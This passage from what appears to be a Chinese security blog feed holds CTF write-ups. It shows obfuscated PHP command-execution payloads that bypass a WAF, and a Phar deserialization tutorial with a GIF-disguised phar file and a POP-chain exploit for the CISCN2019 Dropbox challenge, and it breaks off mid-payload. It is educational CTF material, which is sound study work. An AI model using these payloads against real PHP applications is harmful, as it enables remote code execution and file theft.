data-language="php"><code class="language-php">?c&#x3D;$pi&#x3D;base_convert,$pi(47138,20,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code></pre><p>分析：</p><ul><li><code>base_convert(47138,20,36)  ==&gt;  exec</code>，exec执行一个外部程序，返回最后一行内容</li><li><code>base_convert(8768397090111664438,10,30)  ==&gt;   getallheaders</code>，获取全部 HTTP 请求头信息</li><li>以上语句翻译下来就是<code>exec(getallheaders()&#123;1&#125;)</code>，可以获取请求头第一个字段的值，<code>[]</code>被waf可以用<code>&#123;&#125;</code>包囊数字来解决代替绕过中括号和引号</li></ul><p>发包即可拿到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/image-20200517213809635.png" alt loading="lazy"></p><p>当然这里直接<code>cat flag</code>也是可以的，如下：</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;($pi&#x3D;base_convert)(47138,20,36)($pi(3761671484,13,36)(dechex(109270211243818)))</code></pre><p>命令执行就是<code>exec(&quot;cat /*&quot;)</code>，可以打印出flag</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>利用异或将字符串转化成我们想要的字符串，例如我们需要<code>$_GET</code>，那么就要获得<code>_GET</code>，FUZZ代码如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$payload &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;,  &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39; , &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;        for($j &#x3D; 0;$j &lt;&#x3D;9; $j++)&#123;            $exp &#x3D; $payload[$k] ^ ($i.$j);            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;.&quot;\n&quot;);        &#125;    &#125;&#125;</code></pre><p>在打印出的结果中搜寻想要的字符串，找到最短的再组合</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag</code></pre><ul><li><code>is_nan^(6).(4)  ==&gt;  _G</code></li><li><code>tan^(1).(5)  ==&gt;  ET</code></li><li>以上就和第一种方法类似，然后在传命令执行的代码就可以了</li></ul><p>参考：</p><ul><li><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></li></ul><p>题目还是挺有意思的，如果再发现新方法再补上</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  先看到题目给出的源码：&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化浅析</title>
    <link href="https://www.extrader.top/posts/bb56c28a/"/>
    <id>https://www.extrader.top/posts/bb56c28a/</id>
    <published>2020-05-04T03:49:35.000Z</published>
    <updated>2020-11-08T07:16:22.652Z</updated>
    
    <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/2958#toc-2">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></li><li><a href="https://www.freebuf.com/articles/web/205943.html">PHAR反序列化拓展操作总结</a></li><li><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></li></ul><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p><strong>①</strong>  <strong>a stub</strong></p><p>可以理解为一个标志，格式为<code>xxx</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p><strong>②</strong>  <strong>a manifest describing the contents</strong></p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124151781.png" alt loading="lazy"></p><p><strong>③</strong>  <strong>the file contents</strong></p><p>被压缩文件的内容。</p><p><strong>④</strong>  <strong>a signature for verifying Phar integrity (phar file format only)</strong></p><p>签名，放在文件末尾，格式如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124231445.png" alt loading="lazy"></p><p>通过<code>phar://</code>伪协议对一个<strong>phar</strong>文件进行了文件操作的时候，就可以触发反序列化，达到<strong>RCE</strong>的效果</p><h4 id="产生缘由"><a href="#产生缘由" class="headerlink" title="产生缘由"></a>产生缘由</h4><p>在<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a>处，其调用了<code>php_var_unserialize</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120955832.png" alt loading="lazy"></p><p>因此可以构造一个特殊的phar包，使得代码能够反序列化，从而构造一个pop链，在使用<code>phar://</code>协议读取文件的时候，文件会被解析成phar (<a href="https://www.php.net/manual/zh/intro.phar.php">https://www.php.net/manual/zh/intro.phar.php</a>) 的过程会触发<code>php_var_unserialize</code>函数对<strong>meta-data</strong>的操作，造成反序列化。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>条件</strong></p><ul><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ul><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120506980.png" alt loading="lazy"></p><ul><li><strong>exif</strong>：<code>exif_thumbnail</code>，<code>exif_imagetype</code></li><li><strong>gd</strong>：<code>imageloadfont</code>，<code>imagecreatefrom***</code></li><li><strong>hash</strong>：<code>hash_hmac_file</code>，<code>hash_file</code>，<code>hash_update_file</code>，<code>md5_file</code>，<code>sha1_file</code></li><li><strong>file/url</strong>：<code>get_meta_tags</code>，<code>get_headers</code></li><li><strong>standard</strong>：<code>getimagesize</code>，<code>getimagesizefromstring</code></li></ul><p><strong>zip</strong>：</p><pre class="language-php" data-language="php"><code class="language-php">$zip &#x3D; new ZipArchive();$res &#x3D; $zip-&gt;open(&#39;c.zip&#39;);$zip-&gt;extractTo(&#39;phar:&#x2F;&#x2F;test.phar&#x2F;test&#39;);</code></pre><p>限制<code>phar://</code>不能出现在头几个字符，亦适用于<code>compress.zlib://</code>：</p><pre class="language-php" data-language="php"><code class="language-php">$z &#x3D; &#39;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;sx&#x2F;test.phar&#x2F;test.txt&#39;;</code></pre><p><strong><a href="https://baike.baidu.com/item/PostgreSQL/530240?fr=aladdin">PostgreSQL</a></strong>：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$pdo &#x3D; new PDO(sprintf(&quot;pgsql:host&#x3D;%s;dbname&#x3D;%s;user&#x3D;%s;password&#x3D;%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));@$pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar:&#x2F;&#x2F;test.phar&#x2F;aa&#39;);</code></pre><p><code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样能使用的，需要开启<code>phar</code>的写功能。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>生成<strong>phar</strong>文件：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub    $o &#x3D; new TestObject();    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件    &#x2F;&#x2F;签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504131930692.png" alt loading="lazy"></p><p>明显的序列化存储</p><p>构造利用代码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php     class TestObject &#123;        public function __destruct() &#123;            echo &#39;Destruct called&#39;;        &#125;    &#125;    $filename &#x3D; &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;a_random_string&#39;;    file_exists($filename);?&gt;</code></pre><p>成功打印结果，当然这里换其他的文件操作函数也可以</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132140672.png" alt loading="lazy"></p><p><strong>将phar伪造成其他格式的文件</strong></p><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头    $o &#x3D; new TestObject();    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件    &#x2F;&#x2F;签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132602458.png" alt loading="lazy"></p><p>和上面的一样可以利用成功</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="CISCN2019-华北赛区-Day1-Web1-—Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-—Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]—Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]—Dropbox</h4><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212154616.png" alt loading="lazy"></p><p>先随便注册一个账号登录，随后发现有上传文件和下载，删除文件的功能</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212308364.png" alt loading="lazy"></p><p>测试文件上传，只能上传那三种图片的格式，应该是有白名单，且文件上传后路径不可知，于是抓包测试文件下载和删除功能，其中文件下载处存在文件下载漏洞，于是将整个网站的源码都下载下来，测试后发现，后台在下载界面还是做了权限限制的，不然根目录下的<code>flag</code>就可以直接下下来了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212700778.png" alt loading="lazy"></p><p>有以下文件：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504213252372.png" alt loading="lazy"></p><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: index.php&quot;);    die();&#125;?&gt;.........(HTML)&lt;?phpinclude &quot;class.php&quot;;if (isset($_GET[&#39;register&#39;])) &#123;    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;&#125;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;        $_SESSION[&#39;login&#39;] &#x3D; true;        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;        if (!is_dir($sandbox)) &#123;            mkdir($sandbox);        &#125;        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);        die();    &#125;    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>register.php</p><pre class="language-php" data-language="php"><code class="language-php">.........(HTML)&lt;?phpinclude &quot;class.php&quot;;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; strlen($username) &gt; 2 &amp;&amp; strlen($password) &gt; 1) &#123;        if ($u-&gt;add_user($username, $password)) &#123;            echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;login.php?register&#39;;&lt;&#x2F;script&gt;&quot;);            die();        &#125; else &#123;            echo &quot;&lt;script&gt;toast(&#39;此用户名已被使用&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;            die();        &#125;    &#125;    echo &quot;&lt;script&gt;toast(&#39;请输入有效用户名和密码&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>upload.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;include &quot;class.php&quot;;if (isset($_FILES[&quot;file&quot;])) &#123;    $filename &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];    $pos &#x3D; strrpos($filename, &quot;.&quot;);    if ($pos !&#x3D;&#x3D; false) &#123;        $filename &#x3D; substr($filename, 0, $pos);    &#125;        $fileext &#x3D; &quot;.gif&quot;;    switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123;        case &#39;image&#x2F;gif&#39;:            $fileext &#x3D; &quot;.gif&quot;;            break;        case &#39;image&#x2F;jpeg&#39;:            $fileext &#x3D; &quot;.jpg&quot;;            break;        case &#39;image&#x2F;png&#39;:            $fileext &#x3D; &quot;.png&quot;;            break;        default:            $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;Only gif&#x2F;jpg&#x2F;png allowed&quot;);            Header(&quot;Content-type: application&#x2F;json&quot;);            echo json_encode($response);            die();    &#125;    if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !&#x3D;&#x3D; 0) &#123;        $dst &#x3D; $_SESSION[&#39;sandbox&#39;] . $filename . $fileext;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);        $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);        Header(&quot;Content-type: application&#x2F;json&quot;);        echo json_encode($response);    &#125; else &#123;        $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;Invaild filename&quot;);        Header(&quot;Content-type: application&#x2F;json&quot;);        echo json_encode($response);    &#125;&#125;?&gt;</code></pre><p>download.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>delete.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$dbaddr &#x3D; &quot;127.0.0.1&quot;;$dbuser &#x3D; &quot;root&quot;;$dbpass &#x3D; &quot;root&quot;;$dbname &#x3D; &quot;dropbox&quot;;$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db &#x3D; $db;    &#125;    public function user_exist($username) &#123;        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count &#x3D; $stmt-&gt;num_rows;        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files &#x3D; array();        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();        $filenames &#x3D; scandir($path);        $key &#x3D; array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key &#x3D; array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file &#x3D; new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] &#x3D; array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;        &#125;        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;            $table .&#x3D; &#39;&lt;tr&gt;&#39;;            foreach ($result as $func &#x3D;&gt; $value) &#123;                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;            &#125;            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename &#x3D; $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size &#x3D; filesize($this-&gt;filename);        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>代码核心就在<code>class.php</code>了</p><p>先看到login和register两个文件，用了PDO，注入相当困难，找到到文件下载功能<code>download</code>，可以看到这样的一句代码：<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><strong>ini_set</strong>：出为一个配置选项设置值，可以设置php的一些配置，其中就包括<strong>open_basedir</strong>，用来限制当前程序可以访问的目录。当前设置为<code>getcwd()</code>当前目录和<code>/etc</code>和<code>/tmp</code>三个目录，这就是为什么前面下载不了根目录下的<code>flag</code>了</p><p>再看到<code>delete.php</code>文件，并没有限制，于是我们寻找可利用条件，重点看到<code>class.php</code>，在这个文件的<code>File</code>类中发现了<code>close()</code>方法中有一个<code>file_get_contents</code>方法，明显的文件读取，再找到使用了这个函数的方法，不难发现在<code>User</code>类中的<code>__destruct</code>方法调用了这个函数，<code>__destruct</code>方法是当一个对象被销毁的时候才调用，delete.php中就可以触发这方法，但是这也要这些类中的属性我们可控才能调用这些方法，于是这里就引出了<code>phar</code>伪协议反序列化的操作，详见上面的说明</p><p>于是初步构造payload：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass User &#123;    public $db;&#125;class File &#123;    public $filename;    public function __construct()    &#123;        $this-&gt;filename&#x3D;&#39;&#x2F;flag.txt&#39;;    &#125;&#125;$a &#x3D; new User();$a-&gt;db &#x3D; new File();?&gt;</code></pre><p>但是在<code>file_get_contents</code>后我们并没有回显的函数，于是就需要用到<code>FileList</code>类中的<code>__destruct</code>方法来回显，这里就需要再创建一个<code>FileList</code>类，令其中的<code>files</code>为<code>new File()</code>，但是这里就创建了两个类了，无法达到反序列化的效果，那么我们再来看看如何把这三个类给联系起来，可以看到<code>FileList</code>类中的<code>__call</code>方法，（ 当对象调用一个不存在的方法的时候调用，<strong>$func</strong>：被调用的方法名，<strong>$args</strong> ： 被调用方法中的参数，这是个数组），再看到上面的<code>User的</code>的<code>__destruct</code>方法，如果我们令<code>User</code>类中的<code>db</code>属性为<code>FileList</code>类，调用其中不存在的<code>close</code>方法，就可以完美触发<code>FileList</code>类中的<code>__call</code>方法，再看到<code>__call</code>方法的实现：</p><pre class="language-php" data-language="php"><code class="language-php">public function __call($func, $args) &#123;    array_push($this-&gt;funcs, $func);    foreach ($this-&gt;files as $file) &#123;        $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();    &#125;&#125;</code></pre><p><strong>array_push</strong>：将一个或多个单元压入数组的末尾（入栈）</p><p><strong>foreach</strong>：遍历数组</p><p>看到其中的<code>$file-&gt;$func();</code>，如果<code>$func</code>为<code>close</code>，就可以成功调用<code>File</code>类中的<code>close</code>方法，于是构造完整payload：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass User &#123;    public $db;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct() &#123;        $this-&gt;files &#x3D; array(new File());        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();    &#125;&#125;class File &#123;    public $filename;    public function __construct()    &#123;        $this-&gt;filename&#x3D;&#39;&#x2F;flag.txt&#39;;    &#125;&#125;$o &#x3D; new User();$o -&gt; db &#x3D; new FileList();$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为 phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置 stub$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;poc.php&quot;, &quot;poc&quot;); 